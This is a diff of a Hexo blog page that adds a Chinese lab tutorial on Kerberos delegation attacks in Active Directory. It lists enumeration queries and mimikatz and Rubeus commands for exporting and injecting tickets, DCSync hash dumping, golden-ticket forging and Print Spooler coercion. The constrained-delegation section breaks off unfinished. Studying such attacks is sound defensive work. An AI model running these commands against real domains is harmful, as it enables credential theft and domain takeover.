@@ -21,17 +21,48 @@
     <meta name="keywords" content="hexo,HackerQWQ,blog,CTFer">
     
     <meta name="description" content="">
-    <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="https://hackerqwq.github.io/archives/2020/page/8/index.html">
+    <meta name="description" content="前置知识概述域委派是指将域内用户的权限委派给服务账号或主机用户账号，使得服务账号能以用户的权限在域内展开活动， 委派分为三类：  非约束委派(Unconstrained delegation) 约束委派(Constrained delegation) 基于资源的约束委派(Resource Based Constrained Delegation)  主要还是充分发挥windows的权限控制，假设用">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网渗透之非约束委派攻击&amp;约束委派攻击">
+<meta property="og:url" content="https://hackerqwq.github.io/2021/09/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB-%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="前置知识概述域委派是指将域内用户的权限委派给服务账号或主机用户账号，使得服务账号能以用户的权限在域内展开活动， 委派分为三类：  非约束委派(Unconstrained delegation) 约束委派(Constrained delegation) 基于资源的约束委派(Resource Based Constrained Delegation)  主要还是充分发挥windows的权限控制，假设用">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/20200206130430-2805d11a-489e-1.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20210921101218505.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20210921101845972.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/20200207103902-002e844c-4953-1.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20210921102340682.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20210921102522472.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20210921102704501.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20210921103512738.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20210921103954631.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20210921110032083.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20210921110442896.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20210921110707606.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20210921111100124.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20210921111348395.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20210921111833205.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20210921112123332.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20210922215543785.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20210922222853126.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20210922223344779.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/20200211002107-57633dd6-4c21-1.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/20200211004433-9d945bd4-4c24-1.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20210922225008777.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20210922232440305.png">
+<meta property="article:published_time" content="2021-09-21T02:04:00.000Z">
+<meta property="article:modified_time" content="2021-09-23T07:35:17.915Z">
 <meta property="article:author" content="HacKerQWQ">
+<meta property="article:tag" content="提权">
+<meta property="article:tag" content="内网渗透">
+<meta property="article:tag" content="横向移动">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/20200206130430-2805d11a-489e-1.png">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
     
-    <title>HacKerQWQ&#39;s Studio</title>
+    <title>内网渗透之非约束委派攻击&amp;约束委派攻击 · HacKerQWQ&#39;s Studio</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -212,12 +243,23 @@
 <meta name="generator" content="Hexo 5.2.0"></head>
 
     
+        <body class="post-body">
+    
     
 <header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >HacKerQWQ的博客空间</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">内网渗透之非约束委派攻击&约束委派攻击</a>
+            </div>
+    </div>
     
     <a class="home-link" href=/>HacKerQWQ的博客空间</a>
 </header>
@@ -229,24 +271,78 @@
 
 
 
+
+height:50vh;
 ">
     
     <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/)"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
+            
+            内网渗透之非约束委派攻击&约束委派攻击
+            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
+            
+            <!-- 404 -->
+            
         </p>
         <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "提权">提权</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "内网渗透">内网渗透</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "横向移动">横向移动</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">2.3k</span>Reading time: <span class="post-count reading-time">9 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2021/09/21</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
         
     </div>
 </div>
@@ -347,46 +443,202 @@
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main index-page">
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2020/04/06/First-Blog/" >
             
-                <span class="stick-top iconfont-archer">&#xe63d;</span>
-                
-                <span>First Blog</span>
-        </a>
-        <div class="abstract-content">
-            Welcome to my own blog!It’s my pleasure to make friends with you,if you are avaliable to view my website,I will be appreciate,next few years I will upload my blog here…..
+<main class="main post-page">
+    <article class="article-entry">
+        <h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>域委派是指将域内用户的权限委派给<strong>服务账号</strong>或<strong>主机用户账号</strong>，使得服务账号能以用户的权限在域内展开活动，</p>
+<p>委派分为三类：</p>
+<ul>
+<li>非约束委派(Unconstrained delegation)</li>
+<li>约束委派(Constrained delegation)</li>
+<li>基于资源的约束委派(Resource Based Constrained Delegation)</li>
+</ul>
+<p>主要还是充分发挥windows的权限控制，假设用户A利用自己的身份可以访问到一个网站B，请求网站的资源C，但是网站B上边本身没有资源C，那么网站B就需要用用户A的身份去访问另外一台机器去获取资源C再给到用户</p>
+<h2 id="非约束委派"><a href="#非约束委派" class="headerlink" title="非约束委派"></a>非约束委派</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>用户A去访问服务B，服务B的服务账户开启了非约束委派，那么当用户A访问服务B的时候会将用户A的<strong>TGT</strong>发送给服务B并保存进内存，服务B能够利用用户A的身份去访问用户A能够访问的任意服务</p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/20200206130430-2805d11a-489e-1.png" alt="20200206130430-2805d11a-489e-1"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1、用户机器向KDC（密钥分发中心）发送消息请求可转发的TGT1（认证票据）</span><br><span class="line">2、KDC在消息中给返回TGT1（访问服务1使用）</span><br><span class="line">3、用户通过TGT1请求转发TGT2（访问服务2使用）</span><br><span class="line">4、KDC返回消息TGT2</span><br><span class="line">5、用户使用TGT1向KDC申请访问服务1</span><br><span class="line">6、TGS（票据发放服务）返回ST（服务票据）</span><br><span class="line">7、用户发送AP_REQ请求服务1，包含了TGT1、TGT2、TGT2的sessionkey</span><br><span class="line">8、服务1使用用户发送过来的TGT2请求KDC，并以用户身份请求服务2的ST</span><br><span class="line">9、KDC返回服务2的ST到服务1，这里ST将来源请求标记为用户机器，而不是服务1</span><br><span class="line">10、服务1以用户名义请求服务2</span><br><span class="line">11、服务2回应服务2请求</span><br><span class="line">12、服务1回应用户机器请求</span><br><span class="line">13、服务1能够向KDC请求其他服务ST</span><br><span class="line">14、KDC返回其他服务ST</span><br><span class="line">15、服务1用用户名义请求其他服务</span><br><span class="line">16、其他服务回应服务1</span><br></pre></td></tr></table></figure>
 
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/04/06</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "intro">intro</a>
-    
-</div>
-            
-        </div>
+<h3 id="实际操作"><a href="#实际操作" class="headerlink" title="实际操作"></a>实际操作</h3><p>将HACKERQWQ-PC<strong>主机用户</strong>设置为非约束委派</p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20210921101218505.png" alt="image-20210921101218505"></p>
+<ul>
+<li>当服务账号或者主机被设置为非约束性委派时，其<code>userAccountControl</code>属性会包含<code>TRUSTED_FOR_DELEGATION</code></li>
+</ul>
+<p>使用微软自带ADSI编辑器<code>adsiedit.msc</code>查看LDAP目录树</p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20210921101845972.png" alt="image-20210921101845972"></p>
+<h2 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a>约束委派</h2><p>因为非约束委派的不安全性，约束委派应运而生。在2003之后微软引入了非约束委派，对Kerberos引入<code>S4U</code>，包含了两个子协议<code>S4U2self</code>、<code>S4U2proxy</code>。<code>S4U2self</code>可以代表自身请求针对其自身的Kerberos服务票据(ST)，<code>S4U2proxy</code>可以以用户的名义请求其它服务的ST，约束委派就是限制了<code>S4U2proxy</code>扩展的范围</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1、用户向service1发出请求，用户已通过身份验证，但service1没有用户的授权数据，通常这是由于身份验证是通过Kerberos以外的其他方式验证的</span><br><span class="line">2、通过S4U2self以用户的名义向KDC请求用于访问service1的ST1</span><br><span class="line">3、KDC返回给service1一个用于用户验证service1的ST1</span><br><span class="line">4、service1可以使用ST中的授权数据来满足用户的请求，然后响应用户</span><br><span class="line">注：尽管S4U2self向service1提供有关用户的信息，但S4U2self不允许service1代表用户发出其他服务的请求，这时候就轮到S4U2proxy发挥作用了</span><br><span class="line">5、用户向service1发出请求，service1需要以用户身份访问service2的ST2</span><br><span class="line">6、service1以用户的名义向KDC请求用户访问service2的ST2</span><br><span class="line">7、如果请求中包含PAC，则KDC通过检查PAC的签名数据来验证PAC，如果PAC不存在，则KDC返回ST2给service1</span><br><span class="line">8、service1使用st2以用户的名义向service2发送请求，并判定用户已由KDC进行身份验证</span><br><span class="line">9、service2响应步上一步请求</span><br><span class="line">10、service1响应用户对自己的请求</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/20200207103902-002e844c-4953-1.png" alt="20200207103902-002e844c-4953-1"></p>
+<h3 id="实际操作-1"><a href="#实际操作-1" class="headerlink" title="实际操作"></a>实际操作</h3><p>将HACKERQWQ-PC用户设置为约束委派</p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20210921102340682.png" alt="image-20210921102340682"></p>
+<ul>
+<li>当服务账号或者主机被设置为约束性委派时，其<code>userAccountControl</code>属性包含<code>TRUSTED_TO_AUTH_FOR_DELEGATION</code>，且<code>msDS-AllowedToDelegateTo</code>属性会包含被约束的服务</li>
+</ul>
+<p><code>userAccountControl</code>含有授权的字段</p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20210921102522472.png" alt="image-20210921102522472"></p>
+<p><code>msDS-AllowedToDelegateTo</code>含有委派的服务</p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20210921102704501.png" alt="image-20210921102704501"></p>
+<h1 id="非约束委派攻击"><a href="#非约束委派攻击" class="headerlink" title="非约束委派攻击"></a>非约束委派攻击</h1><h2 id="非约束委派攻击原理"><a href="#非约束委派攻击原理" class="headerlink" title="非约束委派攻击原理"></a>非约束委派攻击原理</h2><p>前面提过，非约束委派的原理是：</p>
+<blockquote>
+<p> 用户A去访问服务B，服务B的服务账户开启了非约束委派，那么当用户A访问服务B的时候会将用户A的<strong>TGT</strong>发送给服务B并保存进内存，服务B能够利用用户A的身份去访问用户A能够访问的任意服务。</p>
+</blockquote>
+<p>因此如果我们的可控主机B是域内非约束委派的主机，当域控或者其他主机通过kerberos协议访问我们的机器的时候，就会在内存留下TGT票据，我们可以通过TGT票据来访问该主机可以访问的任意服务。</p>
+<p>服务列表：</p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20210921103512738.png" alt="image-20210921103512738"></p>
+<h2 id="非约束委派攻击实现"><a href="#非约束委派攻击实现" class="headerlink" title="非约束委派攻击实现"></a>非约束委派攻击实现</h2><h3 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h3><p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20210921103954631.png" alt="image-20210921103954631"></p>
+<h3 id="查找非约束委派"><a href="#查找非约束委派" class="headerlink" title="查找非约束委派"></a>查找非约束委派</h3><p>过滤条件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(&amp;(samAccountType&#x3D;805306368)(userAccountControl:1.2.840.113556.1.4.803:&#x3D;524288))</span><br><span class="line">#查询域内配置非约束委派的服务用户</span><br><span class="line">(&amp;(samAccountType&#x3D;805306369)(userAccountControl:1.2.840.113556.1.4.803:&#x3D;524288))</span><br><span class="line">#查询域内配置为约束委派的主机用户</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><p>ldapsearch(kali自带)</p>
+<p>一般用于域外查询</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -H ldap:&#x2F;&#x2F;192.168.2.2:389 -D &quot;CN&#x3D;hhh,CN&#x3D;Users,DC&#x3D;pentest,DC&#x3D;com&quot; -w password -b &quot;DC&#x3D;pentest,DC&#x3D;com&quot; &quot;(&amp;(samAccountType&#x3D;805306368)(userAccountControl:1.2.840.113556.1.4.803:&#x3D;524288))&quot; |grep -iE &quot;distinguishedName&quot;</span><br><span class="line">#查询非约束委派的服务用户</span><br><span class="line">ldapsearch -x -H ldap:&#x2F;&#x2F;192.168.2.2:389 -D &quot;CN&#x3D;hhh,CN&#x3D;Users,DC&#x3D;pentest,DC&#x3D;com&quot; -w password -b &quot;DC&#x3D;pentest,DC&#x3D;com&quot; &quot;(&amp;(samAccountType&#x3D;805306369)(userAccountControl:1.2.840.113556.1.4.803:&#x3D;524288))&quot; |grep -iE &quot;distinguishedName&quot;</span><br><span class="line">#查询非约束委派的主机用户</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20210921110032083.png" alt="image-20210921110032083"></p>
+</li>
+<li><h4 id="AdFind"><a href="#AdFind" class="headerlink" title="AdFind"></a>AdFind</h4><p>使用参数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind [switches] [-b basedn] [-f filter] [attr list]</span><br></pre></td></tr></table></figure>
+
+<p>参数说明：</p>
+<ul>
+<li>-b：指定要查询的根节点</li>
+<li>-f：LDAP过滤条件</li>
+<li>attr list：需要显示的属性</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC&#x3D;pentest,DC&#x3D;com&quot; -f &quot;(&amp;(samAccountType&#x3D;805306368)(userAccountControl:1.2.840.113556.1.4.803:&#x3D;524288))&quot; cn distinguishedName</span><br><span class="line">#查询服务用户</span><br><span class="line">AdFind.exe -b &quot;DC&#x3D;pentest,DC&#x3D;com&quot; -f &quot;(&amp;(samAccountType&#x3D;805306369)(userAccountControl:1.2.840.113556.1.4.803:&#x3D;524288))&quot; cn distinguishedName</span><br><span class="line">#查询主机用户</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20210921110442896.png" alt="image-20210921110442896"></p>
+</li>
+<li><p>PowerView</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Get-NetUser -Unconstrained -Domain qiyou.com |select name</span><br><span class="line">#查询域内非约束委派用户</span><br><span class="line">Get-NetComputer -Unconstrained -Domain pentest.com</span><br><span class="line">#查询域内非约束委派主机</span><br><span class="line">Get-NetComputer -Unconstrained -Domain pentest.com</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20210921110707606.png" alt="image-20210921110707606"></p>
+</li>
+</ol>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p><code>HackerQWQ-PC</code>主机用户设置了非约束委派，此时只需要域控JC-DC在<code>HackerQWQ-PC</code>进行认证，内存留下<code>TGT</code>凭据，就能造成非约束委派攻击</p>
+<p>首先清空票据，尝试用cifs连接jc-dc</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # kerberos::purge</span><br><span class="line">mimikatz # exit</span><br><span class="line">dir \\jc-dc\c$</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20210921111100124.png" alt="image-20210921111100124"></p>
+<p>当前内存中没有票据，不能通过<code>cifs</code>服务访问域控的共享目录</p>
+<p>这里域控使用<code>winrm</code>连接<code>HackerQWQ-PC</code>,常见的链接方式还有MSSQL和IIS</p>
+<ul>
+<li><code>winrm</code>需要使用<code>Enable-PSRemoting</code>打开</li>
+</ul>
+<p>命令:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Enter-PSSession -ComputerName 计算机名</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20210921111348395.png" alt="image-20210921111348395"></p>
+<p>连接成功</p>
+<p>接下来在<code>HackerQWQ-PC</code>查看内存中的票据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # sekurlsa::tickets &#x2F;export</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20210921111833205.png" alt="image-20210921111833205"></p>
+<p>成功提取出了域控<code>Administrator</code>的票据</p>
+<p>将票据注入内存</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # kerberos::ptt [0;f6795]-2-0-60a00000-Administrator@krbtgt-PENTEST.COM.kirbi</span><br></pre></td></tr></table></figure>
+
+<p>之后再尝试通过<code>cifs</code>连接域控</p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20210921112123332.png" alt="image-20210921112123332"></p>
+<p>成功造成非约束委派攻击</p>
+<h3 id="非约束委派-Spooler打印机服务"><a href="#非约束委派-Spooler打印机服务" class="headerlink" title="非约束委派+Spooler打印机服务"></a>非约束委派+Spooler打印机服务</h3><p>由于单单的非约束委派太被动，需要等管理员来连接，因此<code>tifkin_</code>，<code>enigma0x3</code>和<code>harmj0y</code>在<code>DerbyCon 2018</code>提出用Spooler打印机程序来强制对方主机连接被委派的主机达到非约束委派攻击的目的</p>
+<p>工具链接：(SpoolSample)[<a target="_blank" rel="noopener" href="https://github.com/leechristensen/SpoolSample]">https://github.com/leechristensen/SpoolSample]</a></p>
+<ul>
+<li>默认<code>Print Spooler</code>程序自动运行</li>
+</ul>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20210922215543785.png" alt="image-20210922215543785"></p>
+<h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h3><p>拓扑图</p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20210922222853126.png" alt="image-20210922222853126"></p>
+<p>思路：win7-1是发现的被委派的主机用户，此时使用SpoolSample.exe程序强制win2012在win7-1上进行验证，留下tgt，然后win7-1通过导入tgt就能实现对域控的访问</p>
+<ol>
+<li><p>清空win7-1上的票据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # kerberos::purge</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用SpoolSample.exe程序强制认证</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SpoolSample.exe target server</span><br><span class="line">SpoolSample.exe dc win7-1</span><br></pre></td></tr></table></figure>
+
+<p>本地失败，实战再用</p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20210922223344779.png" alt="image-20210922223344779"></p>
+</li>
+<li><p>获取票据注入内存</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">后续用Rubeus来监听事件id为4624的事件，可以第一事件截取到域控的TGT，监听来自域控OWA2013的登录</span><br><span class="line">Rubeus.exe monitor &#x2F;interval:1 &#x2F;filteruser:OWA2013$</span><br><span class="line"></span><br><span class="line">后续再Rubeus导入base64的票据直接注入进内存</span><br><span class="line">Rubeus.exe ptt &#x2F;ticket:base64</span><br><span class="line">用mimikatz也可</span><br><span class="line">privilege::debug</span><br><span class="line">sekurlsa::tickets &#x2F;export</span><br><span class="line"></span><br><span class="line">导入票据后ptt即可</span><br><span class="line">kerberos::ptt XXX.kirbi</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用dcsync导出域控中的所有用户的hash值，生成黄金票据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync &#x2F;domain:rootkit.org &#x2F;all &#x2F;csv</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/20200211002107-57633dd6-4c21-1.png" alt="20200211002107-57633dd6-4c21-1"></p>
+<p>得到<code>krbtgt</code>用户的hash之后生成一张administrator的黄金票据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden &#x2F;user:Administrator &#x2F;domain:test.local &#x2F;sid:S-1-5-21-662417213-3583657854-423750704 &#x2F;krbtgt:683545df56ea57b168d0ad090e209616 &#x2F;ptt</span><br></pre></td></tr></table></figure>
+
+<p>然后就可以用administrator的身份登录域控</p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/20200211004433-9d945bd4-4c24-1.png" alt="20200211004433-9d945bd4-4c24-1"></p>
+<p>也可以用<code>WinRM</code>服务远程连接域控</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Enter-PSSession -ComputerName dc</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<h1 id="约束委派攻击"><a href="#约束委派攻击" class="headerlink" title="约束委派攻击"></a>约束委派攻击</h1><p>约束委派攻击的原理</p>
+<blockquote>
+<p>被约束委派的主机用户通过模拟任意用户访问被委派的服务</p>
+</blockquote>
+<p>前提：能获取到服务用户的明文密码或Hash值</p>
+<h2 id="约束委派攻击实操"><a href="#约束委派攻击实操" class="headerlink" title="约束委派攻击实操"></a>约束委派攻击实操</h2><h3 id="拓扑图-1"><a href="#拓扑图-1" class="headerlink" title="拓扑图"></a>拓扑图</h3><p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20210922225008777.png" alt="image-20210922225008777"></p>
+<h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><ol>
+<li>设置spn从而使普通用户变为服务用户可进行委派</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setspn -s service&#x2F;name hostname</span><br><span class="line">setspn -A MSSQLSvc&#x2F;HackerQWQ.redteam.org HackerQWQ</span><br></pre></td></tr></table></figure>
+
+<p>​    更多spn操作参考官网</p>
+<p>​    <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc731241(v=ws.11)?redirectedfrom=MSDN#adding-spns">https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc731241(v=ws.11)?redirectedfrom=MSDN#adding-spns</a></p>
+<ol start="2">
+<li>设置好win7-1对dc的cifs的委派</li>
+</ol>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20210922232440305.png" alt="image-20210922232440305"></p>
+<p>3. </p>
+
     </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>Author：<a href="https://hackerqwq.github.io">HacKerQWQ</a>
